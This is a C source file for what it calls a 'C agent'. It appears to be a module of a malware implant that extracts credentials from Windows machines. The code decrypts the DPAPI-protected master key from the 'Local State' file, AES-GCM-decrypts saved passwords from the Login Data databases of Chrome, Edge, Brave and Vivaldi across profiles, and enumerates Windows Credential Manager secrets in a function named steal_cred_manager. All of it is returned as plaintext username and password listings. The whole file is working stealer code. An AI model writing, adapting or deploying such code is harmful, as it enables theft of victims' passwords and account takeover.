/* browsercreds.c — Chromium + CredManager credential extraction for C agent.
 *
 * Chrome v80+: DPAPI-unwrapped AES-256-GCM master key, stored in "Local State".
 * Legacy Chrome: bare DPAPI blob per credential.
 * CredManager: CredEnumerateW via dynamic LoadLibrary (no static advapi32 dep).
 *
 * Requires: bcrypt (linked), crypt32 (linked), sqlite3 amalgamation compiled in. */

#include "browsercreds.h"
#include "b64.h"

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* SQLite3 amalgamation — header only, .c compiled separately */
#include "sqlite3.h"

/* ─── BCrypt function pointers (dynamic, avoids header compat issues) ─────── */

typedef NTSTATUS (WINAPI *pfnBCryptOpen)(void**, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS (WINAPI *pfnBCryptClose)(void*, ULONG);
typedef NTSTATUS (WINAPI *pfnBCryptSetProp)(void*, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pfnBCryptGetProp)(void*, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS (WINAPI *pfnBCryptGenKey)(void*, void**, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *pfnBCryptDecrypt)(void*, PUCHAR, ULONG, void*, PUCHAR, ULONG,
                                             PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS (WINAPI *pfnBCryptDestroyKey)(void*);

static struct {
    HMODULE   h;
    pfnBCryptOpen       Open;
    pfnBCryptClose      Close;
    pfnBCryptSetProp    SetProp;
    pfnBCryptGetProp    GetProp;
    pfnBCryptGenKey     GenKey;
    pfnBCryptDecrypt    Decrypt;
    pfnBCryptDestroyKey DestroyKey;
} g_bc;

static int bcrypt_init(void) {
    if (g_bc.h) return 1;
    g_bc.h = LoadLibraryA("bcrypt.dll");
    if (!g_bc.h) return 0;
    g_bc.Open       = (pfnBCryptOpen)      GetProcAddress(g_bc.h, "BCryptOpenAlgorithmProvider");
    g_bc.Close      = (pfnBCryptClose)     GetProcAddress(g_bc.h, "BCryptCloseAlgorithmProvider");
    g_bc.SetProp    = (pfnBCryptSetProp)   GetProcAddress(g_bc.h, "BCryptSetProperty");
    g_bc.GetProp    = (pfnBCryptGetProp)   GetProcAddress(g_bc.h, "BCryptGetProperty");
    g_bc.GenKey     = (pfnBCryptGenKey)    GetProcAddress(g_bc.h, "BCryptGenerateSymmetricKey");
    g_bc.Decrypt    = (pfnBCryptDecrypt)   GetProcAddress(g_bc.h, "BCryptDecrypt");
    g_bc.DestroyKey = (pfnBCryptDestroyKey)GetProcAddress(g_bc.h, "BCryptDestroyKey");
    return g_bc.Open && g_bc.Close && g_bc.SetProp && g_bc.GetProp &&
           g_bc.GenKey && g_bc.Decrypt && g_bc.DestroyKey;
}

/* BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO — inline definition */
typedef struct {
    ULONG     cbSize;
    ULONG     dwInfoVersion;
    PUCHAR    pbNonce;
    ULONG     cbNonce;
    PUCHAR    pbAuthData;
    ULONG     cbAuthData;
    PUCHAR    pbTag;
    ULONG     cbTag;
    PUCHAR    pbMacContext;
    ULONG     cbMacContext;
    ULONG     cbAAD;
    ULONGLONG cbData;
    ULONG     dwFlags;
} AUTH_MODE_INFO;

/* ─── Helpers ──────────────────────────────────────────────────────────────── */

typedef struct { char *buf; size_t len; size_t cap; } StrBuf;

static void sb_append(StrBuf *sb, const char *s) {
    if (!s) return;
    size_t slen = strlen(s);
    if (sb->len + slen + 1 > sb->cap) {
        sb->cap = (sb->len + slen + 512) * 2;
        sb->buf = (char*)realloc(sb->buf, sb->cap);
        if (!sb->buf) { sb->len = sb->cap = 0; return; }
    }
    memcpy(sb->buf + sb->len, s, slen + 1);
    sb->len += slen;
}

static char* read_file_text(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);
    if (sz <= 0) { fclose(f); return NULL; }
    char *buf = (char*)malloc((size_t)sz + 1);
    if (!buf) { fclose(f); return NULL; }
    size_t r = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    buf[r] = '\0';
    if (out_len) *out_len = r;
    return buf;
}

/* Extract the string value of a JSON key. Searches forward from `json`.
 * Returns malloc'd string or NULL. */
static char* json_str_val(const char *json, const char *key) {
    char search[256];
    snprintf(search, sizeof(search), "\"%s\"", key);
    const char *p = strstr(json, search);
    if (!p) return NULL;
    p += strlen(search);
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r' || *p == ':') p++;
    if (*p != '"') return NULL;
    p++;
    /* find closing quote (no escape handling needed for base64) */
    const char *e = strchr(p, '"');
    if (!e) return NULL;
    size_t len = (size_t)(e - p);
    char *ret = (char*)malloc(len + 1);
    if (ret) { memcpy(ret, p, len); ret[len] = '\0'; }
    return ret;
}

/* ─── DPAPI ────────────────────────────────────────────────────────────────── */

static BYTE* dp_unprotect(const BYTE *data, DWORD len, DWORD *out_len) {
    DATA_BLOB in  = { len, (BYTE*)(uintptr_t)data };
    DATA_BLOB out = { 0, NULL };
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return NULL;
    *out_len = out.cbData;
    BYTE *ret = (BYTE*)malloc(out.cbData + 1);
    if (ret) { memcpy(ret, out.pbData, out.cbData); ret[out.cbData] = 0; }
    LocalFree(out.pbData);
    return ret;
}

/* ─── AES-256-GCM via BCrypt ──────────────────────────────────────────────── */

/* Decrypt Chrome v80+ password. Returns malloc'd string or NULL on failure. */
static char* aes_gcm_decrypt(const BYTE *key, DWORD klen,
                              const BYTE *nonce, DWORD nlen,
                              const BYTE *ct, DWORD ctlen,
                              const BYTE *tag) {
    if (!bcrypt_init()) return NULL;
    if (klen < 32 || nlen != 12) return NULL;

    void *hAlg = NULL, *hKey = NULL;
    BYTE *keyObj = NULL, *out = NULL;
    DWORD koLen = 0, written = 0, tmp = 0;
    NTSTATUS st;
    char *result = NULL;

    /* AES algorithm handle */
    st = g_bc.Open(&hAlg, L"AES", NULL, 0);
    if (st < 0) goto done;

    /* GCM chaining mode */
    st = g_bc.SetProp(hAlg, L"ChainingMode",
                      (PUCHAR)L"ChainingModeGCM",
                      (ULONG)((wcslen(L"ChainingModeGCM") + 1) * sizeof(wchar_t)), 0);
    if (st < 0) goto done;

    /* Key object buffer */
    st = g_bc.GetProp(hAlg, L"ObjectLength", (PUCHAR)&koLen, sizeof(koLen), &tmp, 0);
    if (st < 0) goto done;
    keyObj = (BYTE*)malloc(koLen);
    if (!keyObj) goto done;

    st = g_bc.GenKey(hAlg, &hKey, keyObj, koLen, (PUCHAR)(uintptr_t)key, klen, 0);
    if (st < 0) goto done;

    out = (BYTE*)malloc(ctlen + 1);
    if (!out) goto done;

    AUTH_MODE_INFO ai = {0};
    ai.cbSize        = sizeof(ai);
    ai.dwInfoVersion = 1;
    ai.pbNonce       = (PUCHAR)(uintptr_t)nonce;
    ai.cbNonce       = nlen;
    ai.pbTag         = (PUCHAR)(uintptr_t)tag;
    ai.cbTag         = 16;

    st = g_bc.Decrypt(hKey, (PUCHAR)(uintptr_t)ct, ctlen, &ai,
                      NULL, 0, out, ctlen, &written, 0);
    if (st >= 0) {
        out[written] = '\0';
        result = (char*)out; out = NULL;
    }

done:
    if (hKey) g_bc.DestroyKey(hKey);
    if (hAlg) g_bc.Close(hAlg, 0);
    free(keyObj);
    free(out);
    return result;
}

/* ─── Chrome master key ────────────────────────────────────────────────────── */

static BYTE* get_master_key(const char *base_dir, DWORD *mk_len) {
    char ls[MAX_PATH];
    snprintf(ls, sizeof(ls), "%s\\Local State", base_dir);

    char *raw = read_file_text(ls, NULL);
    if (!raw) return NULL;

    /* Navigate to os_crypt.encrypted_key */
    const char *p = strstr(raw, "\"os_crypt\"");
    if (!p) { free(raw); return NULL; }
    char *enc_b64 = json_str_val(p, "encrypted_key");
    free(raw);
    if (!enc_b64) return NULL;

    size_t dec_len = 0;
    uint8_t *decoded = b64_decode(enc_b64, &dec_len);
    free(enc_b64);
    if (!decoded || dec_len < 5) { free(decoded); return NULL; }

    /* Must start with "DPAPI" */
    if (memcmp(decoded, "DPAPI", 5) != 0) { free(decoded); return NULL; }

    DWORD out_len = 0;
    BYTE *key = dp_unprotect(decoded + 5, (DWORD)(dec_len - 5), &out_len);
    free(decoded);
    *mk_len = out_len;
    return key;
}

/* ─── Per-credential decryption ────────────────────────────────────────────── */

static char* decrypt_chrome_pw(const BYTE *enc, int enc_len,
                                const BYTE *aes_key, DWORD aes_klen) {
    if (!enc || enc_len <= 0) return NULL;

    /* v10/v11: prefix(3) + nonce(12) + ciphertext + tag(16) */
    if (enc_len > 3 && enc[0] == 'v' && enc[1] == '1' &&
        (enc[2] == '0' || enc[2] == '1')) {
        int payload_len = enc_len - 3;
        if (payload_len < 28) return NULL;      /* 12 + 0 + 16 minimum */
        const BYTE *nonce    = enc + 3;
        int ct_body_len      = payload_len - 12 - 16;
        const BYTE *ct       = enc + 3 + 12;
        const BYTE *tag      = ct + ct_body_len;
        if (ct_body_len < 0) return NULL;
        return aes_gcm_decrypt(aes_key, aes_klen,
                               nonce, 12,
                               ct, (DWORD)ct_body_len,
                               tag);
    }

    /* Legacy: bare DPAPI blob */
    DWORD out_len = 0;
    BYTE *plain = dp_unprotect(enc, (DWORD)enc_len, &out_len);
    if (!plain) return NULL;
    char *ret = (char*)malloc(out_len + 1);
    if (ret) { memcpy(ret, plain, out_len); ret[out_len] = '\0'; }
    free(plain);
    return ret;
}

/* ─── SQLite Login Data reader ─────────────────────────────────────────────── */

static void read_logins(const char *db_path, const BYTE *aes_key, DWORD aes_klen,
                         const char *browser, StrBuf *sb) {
    /* Chrome locks the DB — copy to temp */
    char tmp[MAX_PATH];
    snprintf(tmp, sizeof(tmp), "%s\\bc_%lu.db",
             getenv("TEMP") ? getenv("TEMP") : "C:\\Windows\\Temp",
             (unsigned long)GetCurrentProcessId());

    if (!CopyFileA(db_path, tmp, FALSE)) return;

    sqlite3 *db = NULL;
    if (sqlite3_open(tmp, &db) != SQLITE_OK) { DeleteFileA(tmp); return; }

    const char *sql =
        "SELECT origin_url, username_value, password_value "
        "FROM logins WHERE username_value != ''";
    sqlite3_stmt *stmt = NULL;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char *url  = (const char*)sqlite3_column_text(stmt, 0);
            const char *user = (const char*)sqlite3_column_text(stmt, 1);
            const void *enc  = sqlite3_column_blob(stmt, 2);
            int enc_len      = sqlite3_column_bytes(stmt, 2);

            if (!url || !user) continue;
            char *pw = decrypt_chrome_pw((const BYTE*)enc, enc_len, aes_key, aes_klen);
            if (!pw || pw[0] == '\0') { free(pw); continue; }

            char line[4096];
            snprintf(line, sizeof(line), "[%s] %s\n  user: %s\n  pass: %s\n\n",
                     browser, url, user, pw);
            sb_append(sb, line);
            free(pw);
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    DeleteFileA(tmp);
}

/* ─── Windows Credential Manager ──────────────────────────────────────────── */

typedef struct {
    DWORD   Flags;
    DWORD   Type;
    LPWSTR  TargetName;
    LPWSTR  Comment;
    FILETIME LastWritten;
    DWORD   CredentialBlobSize;
    LPBYTE  CredentialBlob;
    DWORD   Persist;
    DWORD   AttributeCount;
    LPVOID  Attributes;
    LPWSTR  TargetAlias;
    LPWSTR  UserName;
} CRED_W;

static void steal_cred_manager(StrBuf *sb) {
    HMODULE hAdv = LoadLibraryA("advapi32.dll");
    if (!hAdv) return;

    typedef BOOL (WINAPI *pCredEnum)(LPCWSTR, DWORD, LPDWORD, CRED_W***);
    typedef VOID (WINAPI *pCredFree)(LPVOID);
    pCredEnum fnEnum = (pCredEnum)GetProcAddress(hAdv, "CredEnumerateW");
    pCredFree fnFree = (pCredFree)GetProcAddress(hAdv, "CredFree");

    if (!fnEnum || !fnFree) { FreeLibrary(hAdv); return; }

    DWORD count = 0;
    CRED_W **creds = NULL;
    if (!fnEnum(NULL, 0, &count, &creds)) { FreeLibrary(hAdv); return; }

    for (DWORD i = 0; i < count; i++) {
        CRED_W *c = creds[i];
        if (!c || !c->UserName) continue;

        char target[512] = {0}, user[256] = {0}, pw[1024] = {0};
        WideCharToMultiByte(CP_UTF8, 0, c->TargetName, -1, target, sizeof(target)-1, NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, c->UserName, -1, user, sizeof(user)-1, NULL, NULL);

        if (c->CredentialBlobSize >= 2 && c->CredentialBlob) {
            /* blob is typically UTF-16 */
            int wchars = (int)(c->CredentialBlobSize / 2);
            WideCharToMultiByte(CP_UTF8, 0, (LPCWSTR)c->CredentialBlob, wchars,
                                pw, sizeof(pw)-1, NULL, NULL);
            /* fallback: check if all printable ASCII */
            int is_utf16 = 0;
            for (int j = 1; j < (int)c->CredentialBlobSize; j += 2)
                if (c->CredentialBlob[j] == 0) { is_utf16 = 1; break; }
            if (!is_utf16) {
                /* probably raw bytes/ASCII */
                int n = c->CredentialBlobSize < (int)sizeof(pw)-1
                        ? c->CredentialBlobSize : (int)sizeof(pw)-1;
                memcpy(pw, c->CredentialBlob, n);
                pw[n] = '\0';
            }
        }

        if (user[0]) {
            char line[2048];
            snprintf(line, sizeof(line), "[CredManager] %s\n  user: %s\n  pass: %s\n\n",
                     target, user, pw);
            sb_append(sb, line);
        }
    }

    fnFree(creds);
    FreeLibrary(hAdv);
}

/* ─── Public entry point ───────────────────────────────────────────────────── */

static const struct { const char *name; const char *rel; } browsers[] = {
    { "Chrome",  "Google\\Chrome\\User Data"               },
    { "Edge",    "Microsoft\\Edge\\User Data"               },
    { "Brave",   "BraveSoftware\\Brave-Browser\\User Data" },
    { "Vivaldi", "Vivaldi\\User Data"                      },
    { NULL, NULL }
};

char* do_browser_creds(void) {
    StrBuf sb = { NULL, 0, 0 };

    const char *local_app = getenv("LOCALAPPDATA");
    if (!local_app || !local_app[0]) local_app = getenv("APPDATA");

    if (local_app && local_app[0]) {
        for (int i = 0; browsers[i].name; i++) {
            char base[MAX_PATH];
            snprintf(base, sizeof(base), "%s\\%s", local_app, browsers[i].rel);

            DWORD attr = GetFileAttributesA(base);
            if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) continue;

            DWORD mk_len = 0;
            BYTE *mk = get_master_key(base, &mk_len);

            /* Default profile */
            char db[MAX_PATH];
            snprintf(db, sizeof(db), "%s\\Default\\Login Data", base);
            if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
                read_logins(db, mk, mk_len, browsers[i].name, &sb);

            /* Additional profiles */
            for (int p = 1; p <= 20; p++) {
                snprintf(db, sizeof(db), "%s\\Profile %d\\Login Data", base, p);
                if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
                    read_logins(db, mk, mk_len, browsers[i].name, &sb);
            }

            free(mk);
        }
    }

    steal_cred_manager(&sb);

    if (!sb.buf || sb.len == 0) {
        free(sb.buf);
        return _strdup("no credentials found");
    }
    return sb.buf;
}
